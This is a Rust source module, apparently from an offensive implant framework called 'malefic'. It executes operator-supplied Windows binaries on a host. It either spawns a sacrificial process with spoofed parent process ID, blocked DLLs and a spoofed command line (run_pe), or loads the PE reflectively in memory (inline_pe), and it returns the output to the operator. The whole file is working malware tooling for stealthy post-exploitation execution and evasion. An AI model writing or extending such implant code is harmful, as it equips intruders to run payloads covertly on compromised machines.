#![allow(unused_assignments)]
use std::ptr::null;

use malefic_helper::win::kit::pe::{inlinepe::inline_pe, runpe::run_pe};
use malefic_helper::common::utils::format_cmdline;
use malefic_proto::module::{Module, ModuleResult, TaskResult};
use malefic_proto::proto::modulepb::BinaryResponse;
use crate::execute::Arch;
use crate::prelude::*;

pub struct ExecuteExe {}

#[async_trait]
#[module_impl("execute_exe")]
impl Module for ExecuteExe {}

#[async_trait]
impl malefic_proto::module::ModuleImpl for ExecuteExe {
    #[allow(unused_variables)]
    async fn run(&mut self, id: u32, receiver: &mut malefic_proto::module::Input, sender: &mut malefic_proto::module::Output) -> ModuleResult {
        let request = check_request!(receiver, Body::ExecuteBinary)?;
        let is_x86 = matches!(Arch::from_u32(request.arch), Some(Arch::I686));
        let entrypoint = request.entry_point;
        let data = request.data;

        let mut result: Vec<u8> = Vec::new();

        if let Some(sacrifice) = request.sacrifice {
            let cmdline = format_cmdline(request.process_name, request.args);
            debug!("{}", cmdline);
            let argue = sacrifice.argue;
            let (start_commandline, hijack_commandline) = if argue.is_empty() {
                (cmdline, String::new())
            } else {
                (argue, cmdline)
            };
            unsafe {
                result = run_pe(
                    start_commandline.as_bytes(),
                    hijack_commandline.as_bytes(),
                    &request.bin,
                    entrypoint.as_bytes(),
                    &data,
                    is_x86,
                    sacrifice.ppid,
                    sacrifice.block_dll,
                    request.output);
            }
        } else {
            let par = if request.args.is_empty() {
                String::new()
            } else {
                format_cmdline(request.process_name, request.args)
            };
            debug!("{}", par);
            unsafe {
                result = inline_pe(
                    request.bin.as_ptr() as _,
                    request.bin.len(),
                    null(),
                    null(),
                    par.as_ptr() as _,
                    par.len(),
                    entrypoint.as_ptr() as _,
                    entrypoint.len(),
                    false,
                    request.output,
                    // 1000
                    request.timeout,
                    request.delay
                );
            }
        }

        Ok(TaskResult::new_with_body(id, Body::BinaryResponse(BinaryResponse{
            status: 0,
            message: Vec::new(),
            data: result,
            err: "".to_string(),
        }))
        )
    }
}